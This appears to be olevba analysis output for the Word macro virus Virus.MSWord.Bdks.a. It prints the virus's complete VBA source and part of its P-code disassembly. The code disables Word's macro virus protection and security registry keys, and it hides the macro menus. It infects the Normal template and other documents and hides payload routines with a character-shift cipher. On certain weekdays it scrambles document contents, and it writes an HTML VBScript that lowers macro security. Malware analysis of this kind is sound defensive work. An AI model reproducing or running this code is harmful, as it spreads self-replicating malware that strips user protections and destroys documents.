olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bdks.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bdks.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bdks.bas 
in file: Virus.MSWord.Bdks.a - OLE stream: 'Macros/VBA/Bdks'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Call AutoOpen
End Sub
Sub AutoOpen()
Call InW_
On Error Resume Next
Mk_D
Call DelText
End Sub
Sub InW_()
On Error Resume Next
Set O_ = Options: Set cc = O_.ConfirmConversions: Set VP = O_.VirusProtection
Set snp = O_.SaveNormalPrompt: Set svp = O_.SavePropertiesPrompt
cc = (Rnd * 0): VP = (Rnd * 0): snp = (Rnd * 0): svp = (Rnd * 0)
On Error Resume Next
Dim yoi As Boolean
Set d_ = NormalTemplate: Set e_ = d_.VBProject: Set f_ = e_.VbComponents
Set g_ = ActiveDocument
Set NT = f_.Item(1)
ln = NT.CodeModule.CountOfLines
yoi = False
For Each oby In f_
If (oby.Name = "Bdks") Then yoi = True
If (oby.Name <> "Bdks") And (oby.Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=d_.FullName, Name:=oby.Name, Object:=wdOrganizerObjectProjectItems
End If
Next oby
NT.CodeModule.DeleteLines 1, ln
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Options...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
On Error Resume Next
Mk_D
If yoi = False Then
Application.OrganizerCopy Source:=g_.FullName, Destination:=d_.FullName, Name:="Bdks", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
d_.Save
Application.DisplayRecentFiles = False
Application.DisplayRecentFiles = True
End If
On Error Resume Next
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
End Sub
Sub InD_()
On Error Resume Next
Dim iya As Boolean
Set a_ = ActiveDocument: Set b_ = a_.VBProject: Set c_ = b_.VbComponents
Set DC = c_.Item(1)
ln2 = DC.CodeModule.CountOfLines
iya = False
For Each x_ In c_
If (x_.Name = "Bdks") Then iya = True
If (x_.Name <> "Bdks") And (x_.Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=a_.FullName, Name:=x_.Name, Object:=wdOrganizerObjectProjectItems
End If
Next x_
DC.CodeModule.DeleteLines 1, ln2
If iya = False Then
On Error Resume Next
M2537012682 = GetAttr(NormalTemplate.FullName)
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
If M2537012682 = vbReadOnly Then GoTo Z
If M2537012682 = vbReadOnly + vbArchive Then GoTo Z
c_.import "c:\windows\dos_.sys"
a_.Save
a_.Saved = True
Z:
End If
End Sub
Sub ViewVBCode()
MsgBox "This region not proper to used..", vbInformation, "Microsoft Word"
End Sub
Sub ToolsCustomize()
ViewVBCode
End Sub
Sub ToolsCustomizeKeyboard()
ViewVBCode
End Sub
Sub FileOpen()
On Error Resume Next
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
WordBasic.DisableAutoMacros True
Dialogs(80).Show
Call InD_
Call InW_
WordBasic.DisableAutoMacros False
Call DelText
End Sub
Sub Autoexit()
On Error Resume Next
Application.Quit
End Sub
Sub FileClose()
InW_
AdText
Sekond
AutoClose
ActiveDocument.Close
End Sub
Sub FileTemplates()
ViewVBCode
End Sub
Sub AutoClose()
InD_
Ganggu
End Sub
Sub AutoExec()
On Error Resume Next
WordBasic.DisableAutoMacros True
Normal.Bdks.InD_
Normal.Bdks.Mk_D
Normal.Bdks.DelText
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
Normal.Bdks.InW_
Application.OnTime Now + TimeValue("00:01:00"), "Normal.Bdks.Jam"
End Sub
Sub Jam()
DC = Documents.Count
If DC <> 0 Then
WordBasic.DisableAutoMacros False
Normal.Bdks.InD_
DelText
On Error Resume Next
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.Save
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
Application.OnTime Now + TimeValue("00:01:00"), "Normal.Bdks.Jam"
End If
End If
End Sub
Private Function Gng()
'
'
'
'
'
'
'
'
'
'
'
'
End Function
Private Sub M_dir()
'Kpt'Yvv{Z€z'Hz'Z{ypun
'Vu'Lyyvy'Ylz|tl'Ul{
'hrhy'D'Z€z{lt5Wyp}h{lWyvmpslZ{ypun/))3')ORL`fSVJHSfTHJOPULcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvu)3')Z€z{ltYvv{)0
'TrKpy'hrhy'2')cz€z{ltczolss)
'TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvu)
'TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)
'Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~k\zly[ltwsh{lzWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvu)
'Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~kZ{hy{|wWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.Saved = False Then
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
InD_
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
WordBasic.FileSave
InD_
End If
End If
ActiveDocument.Save
ActiveDocument.Saved = True
Sekond
InW_
End Sub
Private Function Ganggu()
Call GgG("Gng")
Call Gng
Call DdD("Gng")
ActiveDocument.Saved = True
End Function
Private Sub Wdh()
'Vwlu')c~k5yln)'Mvy'V|{w|{'Hz'*8
'Wypu{'*83')YLNLKP[;)
'Wypu{'*83
'Wypu{'*83')b4ORL`fJSHZZLZfYVV[cllmpsld)
'Jsvzl'*8
'Vu'Lyyvy'Ylz|tl'Ul{
'Zolss')ylnlkp{'6z'c~k5yln)3'}iOpkl
'Rpss')'c~k5yln)
'TznIv')Zlt|h'wyvnyht'kp'~pukv~z'hukh'{hr'ilym|unzp'shnp'()'2'Joy/8:0'2'))'2'Joy/8:0'2')Tptp'Ohy€hup'4'CC[huq|un'Ih{|EE)3'}iPumvyth{pvu3')Tptp'Ohy€hup)
End Sub
Private Sub Yeah()
Call GgG("Yh")
Call Yh
Call DdD("Yh")
End Sub
Private Sub UbahDok()
Call GgG("UbhDk")
Call ubhdk
Call DdD("UbhDk")
End Sub
Private Sub XFind()
Call GgG("Xf")
Call Xf
Call DdD("Xf")
End Sub
Private Sub WinDeath()
Call GgG("Wdh")
Call Wdh
Call DdD("Wdh")
End Sub
Private Sub Yh()
On Error Resume Next
If Weekday(Date) = vbMonday And Time < TimeValue("16:00:00") Then
WinDeath
UbahDok
End If
If Weekday(Date) = vbWednesday And Time < TimeValue("16:00:00") Then
UbahDok
End If
If Weekday(Date) = vbTeusday And Time > TimeValue("16:00:00") Then
UbahDok
End If
End Sub
Private Sub Mk_D()
Call GgG("M_dir")
Call M_dir
Call DdD("M_dir")
End Sub
Sub tlso()
Dialogs(202).Show
End Sub
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call InD_
End Sub
Sub AdText()
On Error Resume Next
Dim d As String
d = ActiveDocument.Path
With ActiveDocument.Styles("Hyperlink").Font
.Underline = wdUnderlineNone
.ColorIndex = wdAuto
End With
ActiveDocument.Hyperlinks.Add Anchor:=ActiveDocument.Content, Address:=d + "\" + ActiveDocument.Name + ".html", SubAddress:=""
End Sub
Sub DelText()
On Error Resume Next
For i = 1 To ActiveDocument.Hyperlinks.Count
ActiveDocument.Hyperlinks.Item(1).Delete
Next
End Sub
Sub FileExit()
On Error Resume Next
Mk_D
DC = Documents.Count
If DC <> 0 Then
InW_
AdText
InD_
Ganggu
End If
Autoexit
End Sub
Private Function DeCode(Code As String)
For xy = 1 To Len(Code)
Ascii = Asc(Mid(Code, xy, 1))
Change = Ascii + 7
On Error Resume Next
NewCode = NewCode & Chr(Change)
Next
DeCode = NewCode & vbCr
End Function
Private Function DeCodes(Code As String)
For xy = 2 To Len(Code)
Ascii = Asc(Mid(Code, xy, 1))
Change = Ascii - 7
On Error Resume Next
NewCode = NewCode & Chr(Change)
Next
DeCodes = NewCode & vbCr
End Function
Private Function DdD(pros As String)
Dim ln As String
On Error Resume Next
N = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcBodyLine(pros, vbext_pk_Proc)
m = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcCountLines(pros, vbext_pk_Proc)
i = N + 1
H = i + (m - 3)
j = j + 1
On Error Resume Next
For j = i To H
ln = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.Lines(j, 1)
G = DeCode(ln)
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ReplaceLine j, "'" + G
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.DeleteLines j + 1, 1
Next
End Function
Private Sub Xf()
'Vwlu')cum5yln)'Mvy'V|{w|{'Hz'*8
'Wypu{'*83')YLNLKP[;)
'Wypu{'*83
'Wypu{'*83')b4ORL`fSVJHSfTHJOPULcZ€z{ltcJ|yylu{Jvu{yvsZl{cJvu{yvscWypu{d)
'Wypu{'*83')bORL`fJ\YYLU[f\ZLYcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvucwvspjplzclwsvylyd)
'Wypu{'*83'))))B')UvMpuk)B'))))B')Dk~vykA78)
'Jsvzl'*8
'Vu'Lyyvy'Ylz|tl'Ul{
'Zolss')ylnlkp{'6z'cum5yln)3'}iOpkl
'Rpss')cum5yln)
End Sub
Private Function GgG(pres As String)
Dim ln As String
On Error Resume Next
N = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcBodyLine(pres, vbext_pk_Proc)
m = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcCountLines(pres, vbext_pk_Proc)
i = N + 1
H = i + (m - 3)
j = j + 1
On Error Resume Next
For j = i To H
ln = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.Lines(j, 1)
G = DeCodes(ln)
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ReplaceLine j, G
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.DeleteLines j + 1, 1
Next
End Function
Private Sub ubhdk()
Dim s, ch, tx As String
On Error Resume Next
For X = 1 To Len(ActiveDocument.Content)
s = Asc(Mid(ActiveDocument.Content, X, 1))
ch = s + 9
tx = tx & Chr(ch)
Next X
yx = tx & vbCr
ActiveDocument.Content = yx
ActiveDocument.Save
ActiveDocument.Saved = True
MsgBox "Ada Problem dengan file anda ?" + Chr(13) + "" + Chr(13) + "Hubungi --> Mimi Haryani - Tanjung Batu", vbInformation, "Mimi Haryani"
End Sub
Sub Sekond()
Dim D1 As String
ht = ActiveDocument.Path
On Error Resume Next
Open (ht + "\" + ActiveDocument.Name + ".html") For Output As #1
Print #1, "<SCRIPT LANGUAGE =" + Chr(34) + "VBSCRIPT" + Chr(34) + Chr(62)
Print #1, "<!--"
Print #1, "Option Explicit"
Print #1, "Dim MyAppl"
Print #1, "On Error Resume Next"
Print #1, "Set MyAppl = CreateObject" + Chr(40) + Chr(34) + "Word.Application" + Chr(34) + Chr(41)
Print #1, "MyAppl.System.PrivateProfileString" + Chr(40) + Chr(34) + Chr(34) + "," + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security" + Chr(34) + "," + Chr(34) + "Level" + Chr(34) + Chr(41) + " = 1"
Print #1, "MyAppl.System.PrivateProfileString" + Chr(40) + Chr(34) + Chr(34) + "," + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options" + Chr(34) + "," + Chr(34) + "EnableMacroVirusProtection" + Chr(34) + Chr(41) + " = 0"
Print #1, "MyAppl.Options.VirusProtection = False"
Print #1, "Set MyAppl = Nothing"
Print #1, "-->"
Print #1, "</SCRIPT>"
Close #1
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bdks.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/Bdks - 20698 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	ArgsCall (Call) InW_ 0x0000 
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall Mk_D 0x0000 
' Line #7:
' 	ArgsCall (Call) DelText 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub InW_())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	SetStmt 
' 	Ld Options 
' 	Set O_ 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld O_ 
' 	MemLd ConfirmConversions 
' 	Set cc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld O_ 
' 	MemLd VirusProtection 
' 	Set VP 
' Line #12:
' 	SetStmt 
' 	Ld O_ 
' 	MemLd SaveNormalPrompt 
' 	Set snp 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld O_ 
' 	MemLd SavePropertiesPrompt 
' 	Set svp 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St cc 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St VP 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St snp 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St svp 
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	Dim 
' 	VarDefn yoi (As Boolean)
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set d_ 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld d_ 
' 	MemLd VBProject 
' 	Set e_ 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld e_ 
' 	MemLd VbComponents 
' 	Set f_ 
' Line #17:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set g_ 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld f_ 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #19:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ln 
' Line #20:
' 	LitVarSpecial (False)
' 	St yoi 
' Line #21:
' 	StartForVariable 
' 	Ld oby 
' 	EndForVariable 
' 	Ld f_ 
' 	ForEach 
' Line #22:
' 	Ld oby 
' 	MemLd New 
' 	LitStr 0x0004 "Bdks"
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St yoi 
' 	EndIf 
' Line #23:
' 	Ld oby 
' 	MemLd New 
' 	LitStr 0x0004 "Bdks"
' 	Ne 
' 	Paren 
' 	Ld oby 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld d_ 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld oby 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld oby 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld ln 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #30:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #31:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #33:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	ArgsCall Mk_D 0x0000 
' Line #37:
' 	Ld yoi 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	Ld g_ 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d_ 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Bdks"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Ld d_ 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #42:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	LitStr 0x0013 "c:\windows\dos_.sys"
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub InD_())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Dim 
' 	VarDefn iya (As Boolean)
' Line #50:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set a_ 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld a_ 
' 	MemLd VBProject 
' 	Set b_ 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld b_ 
' 	MemLd VbComponents 
' 	Set c_ 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld c_ 
' 	ArgsMemLd Item 0x0001 
' 	Set DC 
' Line #52:
' 	Ld DC 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ln2 
' Line #53:
' 	LitVarSpecial (False)
' 	St iya 
' Line #54:
' 	StartForVariable 
' 	Ld x_ 
' 	EndForVariable 
' 	Ld c_ 
' 	ForEach 
' Line #55:
' 	Ld x_ 
' 	MemLd New 
' 	LitStr 0x0004 "Bdks"
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St iya 
' 	EndIf 
' Line #56:
' 	Ld x_ 
' 	MemLd New 
' 	LitStr 0x0004 "Bdks"
' 	Ne 
' 	Paren 
' 	Ld x_ 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #57:
' 	Ld a_ 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld x_ 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld x_ 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld ln2 
' 	Ld DC 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #61:
' 	Ld iya 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St M2537012682 
' Line #64:
' 	LitStr 0x0013 "c:\windows\dos_.sys"
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #65:
' 	Ld M2537012682 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Z 
' 	EndIf 
' Line #66:
' 	Ld M2537012682 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Z 
' 	EndIf 
' Line #67:
' 	LitStr 0x0013 "c:\windows\dos_.sys"
' 	Ld c_ 
' 	ArgsMemCall import 0x0001 
' Line #68:
' 	Ld a_ 
' 	ArgsMemCall Save 0x0000 
' Line #69:
' 	LitVarSpecial (True)
' 	Ld a_ 
' 	MemSt Saved 
' Line #70:
' 	Label Z 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub ViewVBCode())
' Line #74:
' 	LitStr 0x0020 "This region not proper to used.."
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub ToolsCustomize())
' Line #77:
' 	ArgsCall ViewVBCode 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #80:
' 	ArgsCall ViewVBCode 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileOpen())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitStr 0x0013 "c:\windows\dos_.sys"
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #86:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #87:
' 	ArgsCall (Call) InD_ 0x0000 
' Line #88:
' 	ArgsCall (Call) InW_ 0x0000 
' Line #89:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #90:
' 	ArgsCall (Call) DelText 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub Autoexit())
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub FileClose())
' Line #97:
' 	ArgsCall InW_ 0x0000 
' Line #98:
' 	ArgsCall AdText 0x0000 
' Line #99:
' 	ArgsCall Sekond 0x0000 
' Line #100:
' 	ArgsCall AutoClose 0x0000 
' Line #101:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub FileTemplates())
' Line #104:
' 	ArgsCall ViewVBCode 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub AutoClose())
' Line #107:
' 	ArgsCall InD_ 0x0000 
' Line #108:
' 	ArgsCall Ganggu 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub AutoExec())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #113:
' 	Ld Normal 
' 	MemLd Bdks 
' 	ArgsMemCall InD_ 0x0000 
' Line #114:
' 	Ld Normal 
' 	MemLd Bdks 
' 	ArgsMemCall Mk_D 0x0000 
' Line #115:
' 	Ld Normal 
' 	MemLd Bdks 
' 	ArgsMemCall DelText 0x0000 
' Line #116:
' 	LitStr 0x0013 "c:\windows\dos_.sys"
' 	LitStr 0x0004 "Bdks"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd activevbproject 
' 	ArgsMemLd VbComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #117:
' 	Ld Normal 
' 	MemLd Bdks 
' 	ArgsMemCall InW_ 0x0000 
' Line #118:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000F "Normal.Bdks.Jam"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub Jam())
' Line #121:
' 	Ld Documents 
' 	MemLd Count 
' 	St DC 
' Line #122:
' 	Ld DC 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #124:
' 	Ld Normal 
' 	MemLd Bdks 
' 	ArgsMemCall InD_ 0x0000 
' Line #125:
' 	ArgsCall DelText 0x0000 
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #128:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #130:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000F "Normal.Bdks.Jam"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Private Function Gng())
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' 	QuoteRem 0x0000 0x0000 ""
' Line #137:
' 	QuoteRem 0x0000 0x0000 ""
' Line #138:
' 	QuoteRem 0x0000 0x0000 ""
' Line #139:
' 	QuoteRem 0x0000 0x0000 ""
' Line #140:
' 	QuoteRem 0x0000 0x0000 ""
' Line #141:
' 	QuoteRem 0x0000 0x0000 ""
' Line #142:
' 	QuoteRem 0x0000 0x0000 ""
' Line #143:
' 	QuoteRem 0x0000 0x0000 ""
' Line #144:
' 	QuoteRem 0x0000 0x0000 ""
' Line #145:
' 	QuoteRem 0x0000 0x0000 ""
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' 	EndFunc 
' Line #148:
' 	FuncDefn (Private Sub M_dir())
' Line #149:
' 	QuoteRem 0x0000 0x0015 "Kpt'Yvv{Z€z'Hz'Z{ypun"
' Line #150:
' 	QuoteRem 0x0000 0x0014 "Vu'Lyyvy'Ylz|tl'Ul{"
' Line #151:
' 	QuoteRem 0x0000 0x0074 "hrhy'D'Z€z{lt5Wyp}h{lWyvmpslZ{ypun/))3')ORL`fSVJHSfTHJOPULcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvu)3')Z€z{ltYvv{)0"
' Line #152:
' 	QuoteRem 0x0000 0x001C "TrKpy'hrhy'2')cz€z{ltczolss)"
' Line #153:
' 	QuoteRem 0x0000 0x0028 "TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvu)"
' Line #154:
' 	QuoteRem 0x0000 0x0030 "TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)"
' Line #155:
' 	QuoteRem 0x0000 0x0057 "Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~k\zly[ltwsh{lzWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvu)"
' Line #156:
' 	QuoteRem 0x0000 0x0059 "Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~kZ{hy{|wWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)"
' Line #157:
' 	EndSub 
